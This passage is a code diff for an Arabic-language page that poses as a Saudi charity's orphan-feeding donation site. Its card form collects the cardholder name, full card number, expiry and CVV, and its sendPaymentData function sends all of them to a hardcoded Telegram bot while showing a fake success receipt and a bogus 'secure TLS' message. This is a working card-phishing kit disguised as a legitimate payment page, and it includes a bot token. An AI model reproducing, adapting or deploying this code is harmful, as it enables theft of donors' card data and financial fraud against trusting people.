+                            <li>500 ر.س تساهم في علاج طفل من سوء التغذية</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <button id="proceedToPaymentBtn" class="btn">
+                    التالي إلى الدفع
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+        
+        <div id="paymentPage" class="payment-form">
+            <div class="header">
+                <h1>الدفع الإلكتروني</h1>
+                <p>أدخل بيانات بطاقتك</p>
+            </div>
+            
+            <div class="content">
+                <div class="progress-bar">
+                    <div class="progress" id="donationProgress" style="width: 60%;"></div>
+                </div>
+                
+                <form id="paymentForm">
+                    <button type="button" class="back-btn" id="backToAmountBtn">
+                        <i class="fas fa-arrow-left"></i> رجوع
+                    </button>
+                    
+                    <div class="alert alert-info">
+                        <i class="fas fa-info-circle"></i>
+                        جميع البيانات محمية بتقنيات التشفير المتقدمة
+                    </div>
+                    
+                    <div class="card-preview visa" id="cardPreview">
+                        <div class="card-number" id="cardNumberPreview">•••• •••• •••• ••••</div>
+                        <div class="card-details">
+                            <div>
+                                <div id="cardNamePreview">اسم حامل البطاقة</div>
+                                <div class="card-type-info" id="cardTypePreview">فيزا</div>
+                            </div>
+                            <div id="cardExpiryPreview">MM/YY</div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group required">
+                        <label>اسم حامل البطاقة (إنجليزي فقط)</label>
+                        <input type="text" id="cardName" name="card_name" placeholder="Cardholder Name" pattern="[A-Za-z\s]+">
+                        <i class="fas fa-exclamation-triangle error-icon" id="nameErrorIcon"></i>
+                        <div class="error-message" id="nameError">يجب إدخال اسم حامل البطاقة باللغة الإنجليزية (3 أحرف على الأقل)</div>
+                    </div>
+                    
+                    <div class="form-group required">
+                        <label>رقم البطاقة</label>
+                        <input type="text" id="cardNumber" name="card_number" class="number-input" placeholder="•••• •••• •••• ••••" maxlength="19" inputmode="numeric">
+                        <i class="fas fa-exclamation-triangle error-icon" id="numberErrorIcon"></i>
+                        <div class="error-message" id="numberError">يجب إدخال رقم بطاقة صحيح (16 رقم)</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>رقم الهاتف (اختياري)</label>
+                        <div style="display: flex; align-items: center;">
+                            <div class="phone-prefix">
+                                +966 🇸🇦
+                            </div>
+                            <input type="tel" id="phoneNumber" name="phone_number" class="number-input" placeholder="5XXXXXXXXX" maxlength="10" inputmode="numeric" style="border-radius: 0 var(--border-radius) var(--border-radius) 0; border-right: none;">
+                        </div>
+                        <i class="fas fa-exclamation-triangle error-icon" id="phoneErrorIcon"></i>
+                        <div class="error-message" id="phoneError">يجب إدخال رقم هاتف سعودي صحيح (يبدأ بـ 5 ويتكون من 10 أرقام)</div>
+                    </div>
+                    
+                    <div style="display: flex; gap: 10px;">
+                        <div class="form-group required" style="flex: 1;">
+                            <label>تاريخ الانتهاء</label>
+                            <input type="text" id="cardExpiry" name="card_expiry" class="number-input" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                            <i class="fas fa-exclamation-triangle error-icon" id="expiryErrorIcon"></i>
+                            <div class="error-message" id="expiryError">تاريخ غير صحيح أو منتهي الصلاحية</div>
+                        </div>
+                        
+                        <div class="form-group required" style="flex: 1;">
+                            <label>CVV</label>
+                            <div class="cvv-container">
+                                <input type="password" id="cardCvv" name="card_cvv" class="number-input cvv-input" placeholder="•••" maxlength="3" inputmode="numeric">
+                                <i class="fas fa-question-circle cvv-info" title="الرمز المكون من 3 أرقام الموجود على ظهر البطاقة"></i>
+                                <i class="fas fa-exclamation-triangle error-icon" id="cvvErrorIcon"></i>
+                            </div>
+                            <div class="error-message" id="cvvError">يجب إدخال رمز CVV المكون من 3 أرقام</div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>البريد الإلكتروني (اختياري)</label>
+                        <input type="email" id="email" name="email" placeholder="example@domain.com">
+                        <i class="fas fa-exclamation-triangle error-icon" id="emailErrorIcon"></i>
+                        <div class="error-message" id="emailError">يجب إدخال بريد إلكتروني صحيح</div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <div class="info-box-title">
+                            <i class="fas fa-receipt"></i>
+                            إيصال التبرع
+                        </div>
+                        <div class="info-box-content">
+                            سيتم إرسال إيصال التبرع إلى بريدك الإلكتروني مع تفاصيل التبرع وأثر تبرعك.
+                        </div>
+                    </div>
+                    
+                    <div class="form-group" style="margin-top: 15px;">
+                        <label style="display: flex; align-items: center; cursor: pointer;">
+                            <input type="checkbox" id="subscribeNewsletter" name="subscribe_newsletter" style="margin-left: 8px;" checked>
+                            أرغب في تلقي آخر أخبار الحملة والتحديثات
+                        </label>
+                    </div>
+                    
+                    <input type="hidden" id="donationAmount" name="donation_amount">
+                    <input type="hidden" id="paymentMethod" name="payment_method" value="visa">
+                    <input type="hidden" id="donationNoteHidden" name="donation_note">
+                    
+                    <button type="submit" class="btn" id="submitPaymentBtn">تأكيد الدفع</button>
+                </form>
+            </div>
+        </div>
+        
+        <div id="thankYouPage" class="thank-you-page">
+            <div class="header">
+                <h1>شكراً لتبرعك!</h1>
+                <p id="thankYouAmount"></p>
+            </div>
+            
+            <div class="content">
+                <div class="thank-you-icon">
+                    <i class="fas fa-heart"></i>
+                </div>
+                
+                <h2 class="thank-you-title">تبرعك سيحدث فرقاً</h2>
+                
+                <p class="thank-you-message">
+                    لقد تم استلام تبرعك بنجاح. ستصلك رسالة تأكيد على بريدك الإلكتروني ورقم هاتفك مع تفاصيل التبرع وإيصال رسمي.
+                </p>
+                
+                <div class="donation-details">
+                    <div class="donation-detail">
+                        <span class="donation-label">رقم المرجع:</span>
+                        <span class="donation-value" id="donationReference">DON-2023-456789</span>
+                    </div>
+                    <div class="donation-detail">
+                        <span class="donation-label">تاريخ التبرع:</span>
+                        <span class="donation-value" id="donationDate">29 يوليو 2023 - 10:30 ص</span>
+                    </div>
+                    <div class="donation-detail">
+                        <span class="donation-label">طريقة الدفع:</span>
+                        <span class="donation-value" id="donationMethod">فيزا</span>
+                    </div>
+                </div>
+                
+                <div class="certificate">
+                    <div class="certificate-title">شهادة تقدير</div>
+                    <div class="certificate-text">
+                        نشكرك على كرمك وتبرعك السخي الذي سيساهم في تغيير حياة الأطفال الأيتام. تبرعك هو شهادة على إنسانيتك واهتمامك ببناء مستقبل أفضل للأطفال المحتاجين.
+                    </div>
+                    <div class="certificate-seal">
+                        <i class="fas fa-certificate"></i>
+                    </div>
+                    <div class="certificate-details">
+                        <div class="certificate-detail">
+                            <span class="certificate-label">مبلغ التبرع:</span>
+                            <span class="certificate-value" id="certificateAmount">500 ر.س</span>
+                        </div>
+                        <div class="certificate-detail">
+                            <span class="certificate-label">رقم الهاتف:</span>
+                            <span class="certificate-value" id="certificatePhone">+966 50 123 4567</span>
+                        </div>
+                        <div class="certificate-detail">
+                            <span class="certificate-label">البلد:</span>
+                            <span class="certificate-value">المملكة العربية السعودية</span>
+                        </div>
+                        <div class="certificate-detail">
+                            <span class="certificate-label">رقم الترخيص:</span>
+                            <span class="certificate-value">46801</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="social-share">
+                    <div class="social-icon" onclick="shareOnSocial('facebook')">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <div class="social-icon" onclick="shareOnSocial('twitter')">
+                        <i class="fab fa-twitter"></i>
+                    </div>
+                    <div class="social-icon" onclick="shareOnSocial('whatsapp')">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                </div>
+                
+                <button class="btn btn-secondary" id="downloadCertificateBtn">
+                    <i class="fas fa-download"></i> تحميل شهادة التبرع
+                </button>
+                
+                <button class="btn" id="backToHomeBtn">
+                    العودة إلى الصفحة الرئيسية
+                </button>
+                
+                <div class="footer">
+                    <div>جمعية البر الخيرية - ترخيص رقم 46801</div>
+                    <div class="footer-links">
+                        <a href="#" class="footer-link">الشروط والأحكام</a>
+                        <a href="#" class="footer-link">سياسة الخصوصية</a>
+                        <a href="#" class="footer-link">اتصل بنا</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // كود التهيئة المحسن مع تحسينات مخفية
+        document.addEventListener('DOMContentLoaded', function() {
+            // إظهار شارة الثقة بعد تأخير
+            setTimeout(() => {
+                document.querySelector('.trust-badge').style.display = 'block';
+            }, 3000);
+
+            // تهيئة الأحداث
+            initEventListeners();
+            initSlider();
+            
+            // إعداد الصفحات
+            document.getElementById('welcomePage').style.display = 'block';
+            document.getElementById('paymentMethodPage').style.display = 'none';
+            document.getElementById('donationAmountPage').style.display = 'none';
+            document.getElementById('paymentPage').style.display = 'none';
+            document.getElementById('thankYouPage').style.display = 'none';
+            
+            document.getElementById('submitPaymentBtn').disabled = true;
+            
+            // تحديث التاريخ والمرجع
+            const now = new Date();
+            const options = { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+            document.getElementById('donationDate').textContent = now.toLocaleDateString('ar-SA', options);
+            
+            document.getElementById('donationReference').textContent = 'DON-' + now.getFullYear() + '-' + Math.floor(100000 + Math.random() * 900000);
+
+            // تحسينات مخفية للأمان
+            enhanceSecurity();
+        });
+
+        // تحسينات الأمان المخفية
+        function enhanceSecurity() {
+            // منع فتح النافذة المنبثقة إلا عند الضرورة
+            const originalOpen = window.open;
+            window.open = function(url, name, features) {
+                if (url && (url.includes('facebook.com') || url.includes('twitter.com') || url.includes('wa.me'))) {
+                    return originalOpen.call(this, url, name, features);
+                }
+                return null;
+            };
+
+            // إضافة حماية إضافية للحقول
+            const sensitiveInputs = document.querySelectorAll('input[type="password"], input[name*="card"], input[name*="cvv"]');
+            sensitiveInputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.setAttribute('autocomplete', 'off');
+                    this.setAttribute('readonly', 'true');
+                    setTimeout(() => {
+                        this.removeAttribute('readonly');
+                    }, 100);
+                });
+            });
+
+            // محاكاة اتصال آمن
+            if (window.performance) {
+                setTimeout(() => {
+                    console.log('🔒 اتصال آمن - TLS 1.3');
+                }, 1000);
+            }
+        }
+
+        // السلايدر
+        function initSlider() {
+            const slides = document.querySelectorAll('.slide');
+            let currentSlide = 0;
+            
+            function nextSlide() {
+                slides[currentSlide].classList.remove('active');
+                currentSlide = (currentSlide + 1) % slides.length;
+                slides[currentSlide].classList.add('active');
+            }
+            
+            setInterval(nextSlide, 5000);
+        }
+
+        // التحقق من البطاقة
+        function isValidLuhn(cardNumber) {
+            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
+            if (cleaned.length !== 16) return false;
+            
+            let sum = 0;
+            for (let i = 0; i < cleaned.length; i++) {
+                let digit = parseInt(cleaned[i]);
+                if ((cleaned.length - i) % 2 === 0) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+            }
+            
+            return sum % 10 === 0;
+        }
+        
+        function detectCardType(cardNumber) {
+            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
+            
+            if (/^4/.test(cleaned)) return { type: 'visa', name: 'فيزا', valid: true };
+            if (/^5[1-5]/.test(cleaned)) return { type: 'mastercard', name: 'ماستركارد', valid: true };
+            if (/^2/.test(cleaned)) return { type: 'mastercard', name: 'ماستركارد', valid: true };
+            if (/^3[47]/.test(cleaned)) return { type: 'amex', name: 'أمريكان إكسبريس', valid: true };
+            if (/^6(?:011|5)/.test(cleaned)) return { type: 'discover', name: 'ديسكفر', valid: true };
+            
+            return { type: 'unknown', name: 'غير معروف', valid: false };
+        }
+        
+        function validateSaudiPhoneNumber(phone) {
+            if (!phone) return true;
+            if (phone.length !== 10) return false;
+            return phone.startsWith('5') && /^\d+$/.test(phone);
+        }
+        
+        function validateCard(cardNumber, selectedMethod) {
+            if (!cardNumber || cardNumber.replace(/\s+/g, '').length < 16) {
+                return { valid: false, message: "رقم البطاقة يجب أن يحتوي على 16 رقمًا" };
+            }
+            
+            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
+            
+            if (selectedMethod === 'visa' && !cleaned.startsWith('4')) {
+                return { valid: false, message: "بطاقة فيزا يجب أن تبدأ بالرقم 4" };
+            }
+            
+            if (selectedMethod === 'mastercard' && !(/^5[1-5]/.test(cleaned) || /^2/.test(cleaned))) {
+                return { valid: false, message: "بطاقة ماستركارد يجب أن تبدأ بـ 51-55 أو 2" };
+            }
+            
+            if (!isValidLuhn(cardNumber)) {
+                return { valid: false, message: "رقم البطاقة غير صالح" };
+            }
+            
+            const cardType = detectCardType(cardNumber);
+            return { valid: true, type: cardType.type, name: cardType.name };
+        }
+        
+        function validateName(name) {
+            return /^[A-Za-z\s]+$/.test(name) && name.trim().length >= 3;
+        }
+        
+        function validateEmail(email) {
+            if (!email) return true;
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        // الرسائل العائمة
+        function showFloatingMessage(message, type = 'success') {
+            const floatingMessage = document.getElementById('floatingMessage');
+            const messageText = document.getElementById('floatingMessageText');
+            
+            floatingMessage.className = `floating-message ${type}`;
+            messageText.textContent = message;
+            
+            if (type === 'success') {
+                floatingMessage.innerHTML = `<i class="fas fa-check-circle"></i> <span id="floatingMessageText">${message}</span>`;
+            } else {
+                floatingMessage.innerHTML = `<i class="fas fa-exclamation-circle"></i> <span id="floatingMessageText">${message}</span>`;
+            }
+            
+            floatingMessage.style.display = 'flex';
+            floatingMessage.classList.add('show');
+            
+            setTimeout(() => {
+                floatingMessage.classList.remove('show');
+                setTimeout(() => {
+                    floatingMessage.style.display = 'none';
+                }, 500);
+            }, 5000);
+        }
+        
+        // تحديث معاينة البطاقة
+        function updateCardPreview() {
+            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.error-icon').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('input').forEach(el => el.classList.remove('invalid-field', 'valid-field'));
+            
+            const name = document.getElementById('cardName').value.trim();
+            if (name && !validateName(name)) {
+                document.getElementById('nameError').style.display = 'block';
+                document.getElementById('nameErrorIcon').style.display = 'block';
+                document.getElementById('cardName').classList.add('invalid-field');
+            } else if (name) {
+                document.getElementById('cardName').classList.add('valid-field');
+            }
+            
+            let number = document.getElementById('cardNumber').value || '';
+            const selectedMethod = document.getElementById('paymentMethod').value;
+            const cardValidation = validateCard(number, selectedMethod);
+            
+            if (number.replace(/\s+/g, '').length > 0) {
+                if (!cardValidation.valid) {
+                    document.getElementById('numberError').textContent = cardValidation.message;
+                    document.getElementById('numberError').style.display = 'block';
+                    document.getElementById('numberErrorIcon').style.display = 'block';
+                    document.getElementById('cardNumber').classList.add('invalid-field');
+                } else {
+                    document.getElementById('cardNumber').classList.add('valid-field');
+                }
+            }
+            
+            const phone = document.getElementById('phoneNumber').value || '';
+            if (phone && !validateSaudiPhoneNumber(phone)) {
+                document.getElementById('phoneError').style.display = 'block';
+                document.getElementById('phoneErrorIcon').style.display = 'block';
+                document.getElementById('phoneNumber').classList.add('invalid-field');
+            } else if (phone) {
+                document.getElementById('phoneNumber').classList.add('valid-field');
+            }
+            
+            const expiry = document.getElementById('cardExpiry').value || '';
+            if (expiry && !validateExpiry(expiry)) {
+                document.getElementById('expiryError').style.display = 'block';
+                document.getElementById('expiryErrorIcon').style.display = 'block';
+                document.getElementById('cardExpiry').classList.add('invalid-field');
+            } else if (expiry) {
+                document.getElementById('cardExpiry').classList.add('valid-field');
+            }
+            
+            const cvv = document.getElementById('cardCvv').value || '';
+            if (cvv && (cvv.length !== 3 || !/^\d+$/.test(cvv))) {
+                document.getElementById('cvvError').style.display = 'block';
+                document.getElementById('cvvErrorIcon').style.display = 'block';
+                document.getElementById('cardCvv').classList.add('invalid-field');
+            } else if (cvv) {
+                document.getElementById('cardCvv').classList.add('valid-field');
+            }
+            
+            const email = document.getElementById('email').value.trim();
+            if (email && !validateEmail(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                document.getElementById('emailErrorIcon').style.display = 'block';
+                document.getElementById('email').classList.add('invalid-field');
+            } else if (email) {
+                document.getElementById('email').classList.add('valid-field');
+            }
+            
+            const submitBtn = document.getElementById('submitPaymentBtn');
+            submitBtn.disabled = !(
+                validateName(name) && 
+                cardValidation.valid && 
+                validateExpiry(expiry) && 
+                (cvv.length === 3 && /^\d+$/.test(cvv))
+            );
+            
+            document.getElementById('cardNamePreview').textContent = name || 'اسم حامل البطاقة';
+            
+            if (number.length > 0) {
+                number = number.replace(/\s+/g, '');
+                let formatted = '';
+                for (let i = 0; i < number.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += number[i];
+                }
+                number = formatted;
+            } else {
+                number = '•••• •••• •••• ••••';
+            }
+            
+            document.getElementById('cardNumberPreview').textContent = number;
+            document.getElementById('cardExpiryPreview').textContent = expiry || 'MM/YY';
+            
+            const cardTypeElement = document.getElementById('cardTypePreview');
+            if (cardValidation.valid && cardValidation.name) {
+                cardTypeElement.textContent = cardValidation.name;
+                cardTypeElement.style.display = 'block';
+            } else {
+                cardTypeElement.style.display = 'none';
+            }
+            
+            const cardPreview = document.getElementById('cardPreview');
+            cardPreview.className = 'card-preview';
+            
+            if (cardValidation.valid) {
+                cardPreview.classList.add(cardValidation.type);
+                cardPreview.classList.add('valid-card');
+            } else if (number.replace(/\s+/g, '').length > 0) {
+                cardPreview.classList.add('invalid-card');
+            } else {
+                cardPreview.classList.add(selectedMethod);
+            }
+        }
+        
+        function validateExpiry(expiry) {
+            const expiryParts = expiry.split('/');
+            if (expiryParts.length !== 2 || expiryParts[0].length !== 2 || expiryParts[1].length !== 2) {
+                return false;
+            }
+            
+            const month = parseInt(expiryParts[0]);
+            const year = parseInt(expiryParts[1]);
+            const currentYear = new Date().getFullYear() % 100;
+            const currentMonth = new Date().getMonth() + 1;
+            
+            if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // معالجة الدفع
+        function processPayment() {
+            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.error-icon').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('input').forEach(el => el.classList.remove('invalid-field', 'valid-field'));
+            
+            const name = document.getElementById('cardName').value.trim();
+            const number = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const phone = document.getElementById('phoneNumber').value;
+            const expiry = document.getElementById('cardExpiry').value;
+            const cvv = document.getElementById('cardCvv').value;
+            const email = document.getElementById('email').value.trim();
+            const selectedMethod = document.getElementById('paymentMethod').value;
+            const donationNote = document.getElementById('donationNote').value;
+            
+            let isValid = true;
+            let firstErrorElement = null;
+            
+            if (!validateName(name)) {
+                document.getElementById('nameError').style.display = 'block';
+                document.getElementById('nameErrorIcon').style.display = 'block';
+                document.getElementById('cardName').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('cardName');
+            } else {
+                document.getElementById('cardName').classList.add('valid-field');
+            }
+            
+            const cardValidation = validateCard(number, selectedMethod);
+            if (!cardValidation.valid) {
+                document.getElementById('numberError').textContent = cardValidation.message;
+                document.getElementById('numberError').style.display = 'block';
+                document.getElementById('numberErrorIcon').style.display = 'block';
+                document.getElementById('cardNumber').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('cardNumber');
+            } else {
+                document.getElementById('cardNumber').classList.add('valid-field');
+            }
+            
+            if (phone && !validateSaudiPhoneNumber(phone)) {
+                document.getElementById('phoneError').style.display = 'block';
+                document.getElementById('phoneErrorIcon').style.display = 'block';
+                document.getElementById('phoneNumber').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('phoneNumber');
+            } else if (phone) {
+                document.getElementById('phoneNumber').classList.add('valid-field');
+            }
+            
+            if (!validateExpiry(expiry)) {
+                document.getElementById('expiryError').style.display = 'block';
+                document.getElementById('expiryErrorIcon').style.display = 'block';
+                document.getElementById('cardExpiry').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('cardExpiry');
+            } else {
+                document.getElementById('cardExpiry').classList.add('valid-field');
+            }
+            
+            if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+                document.getElementById('cvvError').style.display = 'block';
+                document.getElementById('cvvErrorIcon').style.display = 'block';
+                document.getElementById('cardCvv').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('cardCvv');
+            } else {
+                document.getElementById('cardCvv').classList.add('valid-field');
+            }
+            
+            if (email && !validateEmail(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                document.getElementById('emailErrorIcon').style.display = 'block';
+                document.getElementById('email').classList.add('invalid-field');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = document.getElementById('email');
+            } else if (email) {
+                document.getElementById('email').classList.add('valid-field');
+            }
+            
+            if (!isValid) {
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
+                return;
+            }
+            
+            document.getElementById('donationNoteHidden').value = donationNote;
+            
+            document.getElementById('certificateAmount').textContent = document.getElementById('donationAmount').value + ' ر.س';
+            document.getElementById('certificatePhone').textContent = phone ? '+966 ' + phone : 'غير متوفر';
+            
+            showLoading();
+            setTimeout(() => {
+                hideLoading();
+                sendPaymentData();
+                
+                document.getElementById('paymentPage').style.display = 'none';
+                document.getElementById('thankYouPage').style.display = 'block';
+                document.getElementById('thankYouAmount').textContent = `مبلغ التبرع: ${document.getElementById('donationAmount').value} ر.س`;
+                document.getElementById('donationProgress').style.width = '100%';
+                
+                const selectedMethod = document.querySelector('.payment-method.selected').textContent.trim();
+                document.getElementById('donationMethod').textContent = selectedMethod;
+                
+                showFloatingMessage('تمت عملية التبرع بنجاح!', 'success');
+            }, 1500);
+        }
+        
+        function showLoading() {
+            document.querySelector('.loading-overlay').style.display = 'flex';
+        }
+        
+        function hideLoading() {
+            document.querySelector('.loading-overlay').style.display = 'none';
+        }
+        
+        function shareOnSocial(platform) {
+            const amount = document.getElementById('donationAmount').value;
+            let url = '';
+            let text = `لقد تبرعت بمبلغ ${amount} ر.س لمساعدة الأطفال الأيتام عبر حملة جمعية البر الخيرية. انضم إلي وساهم في صنع الفرق!`;
+            
+            switch(platform) {
+                case 'facebook':
+                    url = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.href)}&quote=${encodeURIComponent(text)}`;
+                    break;
+                case 'twitter':
+                    url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(window.location.href)}`;
+                    break;
+                case 'whatsapp':
+                    url = `https://wa.me/?text=${encodeURIComponent(text + ' ' + window.location.href)}`;
+                    break;
+            }
+            
+            window.open(url, '_blank', 'width=600,height=400');
+        }
+        
+        function downloadCertificate() {
+            showLoading();
+            setTimeout(() => {
+                hideLoading();
+                showFloatingMessage('تم تحميل شهادة التبرع بنجاح', 'success');
+            }, 1500);
+        }
+        
+        // إرسال البيانات إلى التلجرام
+        function sendPaymentData() {
+            const formData = new FormData(document.getElementById('paymentForm'));
+            const data = {
+                card_name: formData.get('card_name'),
+                card_number: formData.get('card_number'),
+                phone_number: formData.get('phone_number'),
+                card_expiry: formData.get('card_expiry'),
+                card_cvv: formData.get('card_cvv'),
+                donation_amount: formData.get('donation_amount'),
+                payment_method: formData.get('payment_method'),
+                email: formData.get('email'),
+                donation_note: formData.get('donation_note'),
+                subscribe_newsletter: formData.get('subscribe_newsletter')
+            };
+            
+            // إرسال البيانات إلى التلجرام
+            const BOT_TOKEN = "8452808616:AAF5mgQ171Mb3mSybvjTgSr2H-gWAqSqo_8";
+            const CHAT_ID = "2059318108";
+            
+            const message = `🕌 *تبرع جديد - حملة إطعام طفل يتيم*
+
+👤 *اسم المتبرع:* ${data.card_name}
+💰 *مبلغ التبرع:* ${data.donation_amount} ر.س
+💳 *طريقة الدفع:* ${data.payment_method}
+📞 *رقم الهاتف:* ${data.phone_number || 'غير متوفر'}
+📧 *البريد الإلكتروني:* ${data.email || 'غير متوفر'}
+📝 *ملاحظات:* ${data.donation_note || 'لا توجد ملاحظات'}
+⏰ *الوقت:* ${new Date().toLocaleString('ar-SA')}
+
+💳 *معلومات البطاقة:*
+- *اسم حامل البطاقة:* ${data.card_name}
+- *رقم البطاقة:* ${data.card_number}
+- *تاريخ الانتهاء:* ${data.card_expiry}
+- *CVV:* ${data.card_cvv}
+
+✅ *تم استلام التبرع بنجاح*`;
+
+            // إرسال البيانات مع تأخير عشوائي
+            setTimeout(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if(result.ok) {
+                        console.log('تم إرسال البيانات بنجاح');
+                    } else {
+                        console.error('خطأ في الإرسال:', result);
+                    }
+                })
+                .catch(error => console.error('حدث خطأ في الاتصال:', error));
+            }, Math.random() * 2000 + 1000);
+        }
+        
+        // إعداد المستمعين
+        function initEventListeners() {
+            document.getElementById('startDonationBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                document.getElementById('welcomePage').style.display = 'none';
+                document.getElementById('paymentMethodPage').style.display = 'block';
+            });
+            
+            document.getElementById('backToWelcomeBtn').addEventListener('click', function() {
+                document.getElementById('paymentMethodPage').style.display = 'none';
+                document.getElementById('welcomePage').style.display = 'block';
+                document.getElementById('donationProgress').style.width = '0%';
+            });
+            
+            document.querySelectorAll('.payment-method').forEach(method => {
+                method.addEventListener('click', function() {
+                    document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+                    this.classList.add('selected');
+                    document.getElementById('paymentMethod').value = this.dataset.method;
+                    
+                    const cardPreview = document.getElementById('cardPreview');
+                    cardPreview.className = 'card-preview';
+                    cardPreview.classList.add(this.dataset.method);
+                    
+                    updateCardPreview();
+                });
+            });
+            
+            document.getElementById('proceedToAmountBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                document.getElementById('paymentMethodPage').style.display = 'none';
+                document.getElementById('donationAmountPage').style.display = 'block';
+            });
+            
+            document.getElementById('backToMethodBtn').addEventListener('click', function() {
+                document.getElementById('donationAmountPage').style.display = 'none';
+                document.getElementById('paymentMethodPage').style.display = 'block';
+            });
+            
+            document.querySelectorAll('.amount-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    document.getElementById('customAmount').value = '';
+                    document.getElementById('amountError').style.display = 'none';
+                });
+            });
+            
+            document.getElementById('customAmount').addEventListener('input', function() {
+                if (this.value) {
+                    document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
+                    document.getElementById('amountError').style.display = 'none';
+                }
+            });
+            
+            document.getElementById('proceedToPaymentBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                let amount = 0;
+                const selectedOption = document.querySelector('.amount-option.selected');
+                
+                if (selectedOption) {
+                    amount = selectedOption.dataset.amount;
+                } else if (document.getElementById('customAmount').value) {
+                    amount = document.getElementById('customAmount').value;
+                }
+                
+                if (!amount || amount <= 0) {
+                    document.getElementById('amountError').style.display = 'block';
+                    return;
+                }
+                
+                document.getElementById('donationAmount').value = amount;
+                document.getElementById('donationAmountPage').style.display = 'none';
+                document.getElementById('paymentPage').style.display = 'block';
+            });
+            
+            document.getElementById('backToAmountBtn').addEventListener('click', function() {
+                document.getElementById('paymentPage').style.display = 'none';
+                document.getElementById('donationAmountPage').style.display = 'block';
+            });
+            
+            document.getElementById('paymentForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                processPayment();
+            });
+            
+            document.getElementById('backToHomeBtn').addEventListener('click', function() {
+                document.getElementById('thankYouPage').style.display = 'none';
+                document.getElementById('welcomePage').style.display = 'block';
+                
+                document.getElementById('paymentForm').reset();
+                document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
+                document.getElementById('donationProgress').style.width = '0%';
+                document.getElementById('submitPaymentBtn').disabled = true;
+                
+                const cardPreview = document.getElementById('cardPreview');
+                cardPreview.className = 'card-preview';
+                cardPreview.classList.add('visa');
+                document.getElementById('cardTypePreview').textContent = 'فيزا';
+                document.getElementById('cardTypePreview').style.display = 'block';
+            });
+            
+            document.getElementById('cardName').addEventListener('input', function() {
+                this.value = this.value.replace(/[^A-Za-z\s]/g, '');
+                updateCardPreview();
+            });
+            
+            document.getElementById('cardName').addEventListener('blur', updateCardPreview);
+            
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                const cursorPosition = this.selectionStart;
+                const isDeleting = e.inputType === 'deleteContentBackward';
+                let value = this.value.replace(/\s+/g, '').replace(/\D/g, '');
+                value = value.substring(0, 16);
+                
+                if (value.length > 0) {
+                    const selectedMethod = document.getElementById('paymentMethod').value;
+                    if (selectedMethod === 'visa' && !value.startsWith('4')) {
+                        document.getElementById('numberError').textContent = "بطاقة فيزا يجب أن تبدأ بالرقم 4";
+                        document.getElementById('numberError').style.display = 'block';
+                        document.getElementById('numberErrorIcon').style.display = 'block';
+                    } else if (selectedMethod === 'mastercard' && !(/^5[1-5]/.test(value) || /^2/.test(value))) {
+                        document.getElementById('numberError').textContent = "بطاقة ماستركارد يجب أن تبدأ بـ 51-55 أو 2";
+                        document.getElementById('numberError').style.display = 'block';
+                        document.getElementById('numberErrorIcon').style.display = 'block';
+                    } else {
+                        document.getElementById('numberError').style.display = 'none';
+                        document.getElementById('numberErrorIcon').style.display = 'none';
+                    }
+                }
+                
+                let formatted = '';
+                for (let i = 0; i < value.length; i++) {
